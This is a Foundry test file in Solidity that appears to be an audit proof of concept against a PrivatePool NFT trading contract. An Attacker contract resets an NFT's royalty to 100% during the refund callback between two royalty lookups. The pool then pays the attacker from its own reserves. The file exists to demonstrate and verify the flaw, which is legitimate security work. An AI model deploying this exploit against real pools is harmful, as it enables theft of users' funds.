// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../../src/PrivatePool.sol";
import "../../src/Factory.sol";
import "solmate/tokens/ERC721.sol";
import "solmate/tokens/ERC20.sol";
import "openzeppelin/token/common/ERC2981.sol";

// Mock NFT contract with ERC2981 royalty support that allows dynamic royalty changes
contract MaliciousNFT is ERC721, ERC2981 {
    uint256 private _tokenIdCounter;
    
    constructor() ERC721("MaliciousNFT", "MNFT") {}
    
    function mint(address to) public returns (uint256) {
        uint256 tokenId = _tokenIdCounter++;
        _mint(to, tokenId);
        return tokenId;
    }
    
    function tokenURI(uint256) public pure override returns (string memory) {
        return "";
    }
    
    function setTokenRoyalty(uint256 tokenId, address receiver, uint96 feeNumerator) public {
        _setTokenRoyalty(tokenId, receiver, feeNumerator);
    }
    
    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC721, ERC2981) returns (bool) {
        return super.supportsInterface(interfaceId);
    }
}

// Mock base token
contract MockERC20 is ERC20 {
    constructor() ERC20("MockToken", "MTK", 18) {}
    
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

// Attacker contract that exploits the double _getRoyalty call vulnerability
contract Attacker is ERC721TokenReceiver {
    PrivatePool public pool;
    MaliciousNFT public nft;
    MockERC20 public baseToken;
    uint256 public tokenId;
    bool public exploitTriggered;
    
    constructor(PrivatePool _pool, MaliciousNFT _nft, MockERC20 _baseToken) {
        pool = _pool;
        nft = _nft;
        baseToken = _baseToken;
    }
    
    function setTokenId(uint256 _tokenId) external {
        tokenId = _tokenId;
    }
    
    // This function is called when receiving ETH refund during buy()
    // Between the two _getRoyalty calls, we change the royalty from 0% to 100%
    receive() external payable {
        if (!exploitTriggered) {
            exploitTriggered = true;
            // Change royalty from 0% to 100% (10000 basis points)
            nft.setTokenRoyalty(tokenId, address(this), 10000);
        }
    }
    
    function exploit(uint256[] memory tokenIds, uint256[] memory tokenWeights) external payable {
        exploitTriggered = false;
        
        // Approve the pool to spend our base tokens
        baseToken.approve(address(pool), type(uint256).max);
        
        // Execute the buy - this will trigger the vulnerability
        pool.buy{value: msg.value}(tokenIds, tokenWeights, PrivatePool.MerkleMultiProof(new bytes32[](0), new bool[](0)));
    }
}

// Mock Factory for protocol fee
contract MockFactory {
    mapping(uint256 => address) public ownerOf;
    uint16 public protocolFeeRate;
    
    constructor() {
        protocolFeeRate = 0; // No protocol fee for simplicity
    }
    
    function setOwner(uint160 poolId, address owner) external {
        ownerOf[poolId] = owner;
    }
}

// Mock Royalty Registry
contract MockRoyaltyRegistry {
    function getRoyaltyLookupAddress(address nft) external pure returns (address) {
        return nft;
    }
}

contract ExploitTest is Test {
    PrivatePool public pool;
    MaliciousNFT public nft;
    MockERC20 public baseToken;
    MockFactory public factory;
    MockRoyaltyRegistry public royaltyRegistry;
    Attacker public attacker;
    
    address public poolOwner;
    address public victim;
    
    uint256 public nftTokenId;
    
    function setUp() public {
        // Setup accounts
        poolOwner = address(0x1);
        victim = address(0x2);
        
        // Deploy mock contracts
        factory = new MockFactory();
        royaltyRegistry = new MockRoyaltyRegistry();
        nft = new MaliciousNFT();
        baseToken = new MockERC20();
        
        // Deploy PrivatePool implementation
        PrivatePool implementation = new PrivatePool(
            address(factory),
            address(royaltyRegistry),
            address(0) // No stolen NFT oracle
        );
        
        // Deploy pool as minimal proxy (simplified - using implementation directly for testing)
        pool = implementation;
        
        // Initialize the pool with ETH as base token
        pool.initialize(
            address(0), // ETH as base token
            address(nft),
            100 ether, // virtualBaseTokenReserves
            100 ether, // virtualNftReserves
            0, // changeFee
            200, // feeRate (2%)
            bytes32(0), // no merkle root (all NFTs weight 1e18)
            false, // useStolenNftOracle
            true // payRoyalties - CRITICAL: royalties are enabled
        );
        
        // Set pool owner in factory
        factory.setOwner(uint160(address(pool)), poolOwner);
        
        // Mint NFT to pool
        nftTokenId = nft.mint(address(pool));
        
        // Initially set royalty to 0% for the NFT
        nft.setTokenRoyalty(nftTokenId, address(this), 0);
        
        // Fund the pool with ETH
        vm.deal(address(pool), 100 ether);
        
        // Deploy attacker contract
        attacker = new Attacker(pool, nft, baseToken);
        
        // Fund attacker with ETH for the purchase
        vm.deal(address(attacker), 10 ether);
    }
    
    function testRoyaltyExploit() public {
        // Record initial balances
        uint256 poolBalanceBefore = address(pool).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        uint256 attackerNFTBalanceBefore = nft.balanceOf(address(attacker));
        
        console.log("=== Initial State ===");
        console.log("Pool ETH balance:", poolBalanceBefore);
        console.log("Attacker ETH balance:", attackerBalanceBefore);
        console.log("Attacker NFT balance:", attackerNFTBalanceBefore);
        
        // Calculate expected cost for buying 1 NFT (without royalty manipulation)
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = nftTokenId;
        uint256[] memory tokenWeights = new uint256[](1);
        tokenWeights[0] = 1e18;
        
        (uint256 expectedCost,,) = pool.buyQuote(1e18);
        console.log("Expected cost (without exploit):", expectedCost);
        
        // Set the token ID in attacker contract
        attacker.setTokenId(nftTokenId);
        
        // Execute the exploit
        // The attacker will:
        // 1. Call buy() with royalty set to 0%
        // 2. First _getRoyalty call returns 0% -> royaltyFeeAmount = 0
        // 3. netInputAmount is calculated without royalty fees
        // 4. Attacker sends netInputAmount in ETH
        // 5. Pool refunds excess ETH, triggering attacker's receive()
        // 6. In receive(), attacker changes royalty to 100%
        // 7. Second _getRoyalty call returns 100% -> royaltyFee = salePrice
        // 8. Pool pays the full salePrice as royalty to attacker
        // 9. Attacker receives NFT + royalty payment, but only paid netInputAmount (without royalty)
        
        console.log("\n=== Executing Exploit ===");
        attacker.exploit{value: expectedCost}(tokenIds, tokenWeights);
        
        // Record final balances
        uint256 poolBalanceAfter = address(pool).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 attackerNFTBalanceAfter = nft.balanceOf(address(attacker));
        
        console.log("\n=== Final State ===");
        console.log("Pool ETH balance:", poolBalanceAfter);
        console.log("Attacker ETH balance:", attackerBalanceAfter);
        console.log("Attacker NFT balance:", attackerNFTBalanceAfter);
        
        // Calculate the profit
        uint256 poolLoss = poolBalanceBefore - poolBalanceAfter;
        uint256 attackerProfit = attackerBalanceAfter - (attackerBalanceBefore - expectedCost);
        
        console.log("\n=== Exploit Results ===");
        console.log("Pool loss:", poolLoss);
        console.log("Attacker profit (excluding NFT):", attackerProfit);
        console.log("Expected cost paid:", expectedCost);
        
        // Verify the exploit succeeded
        // 1. Attacker received the NFT
        assertEq(attackerNFTBalanceAfter, attackerNFTBalanceBefore + 1, "Attacker should have received NFT");
        
        // 2. Pool lost more than just the expected cost (it paid royalties from its own funds)
        assertGt(poolLoss, expectedCost, "Pool should have lost more than expected cost");
        
        // 3. Attacker gained ETH (received royalty payment)
        assertGt(attackerBalanceAfter, attackerBalanceBefore - expectedCost, "Attacker should have profited");
        
        // The vulnerability is proven: 
        // - Attacker paid only the base price (without royalties in first calculation)
        // - But received 100% royalty payment (based on second calculation)
        // - Pool paid the royalty from its own reserves instead of from the buyer
        
        console.log("\n=== VULNERABILITY CONFIRMED ===");
        console.log("The attacker manipulated royalty between two _getRoyalty() calls");
        console.log("Pool paid royalties from its own funds instead of collecting from buyer");
    }
}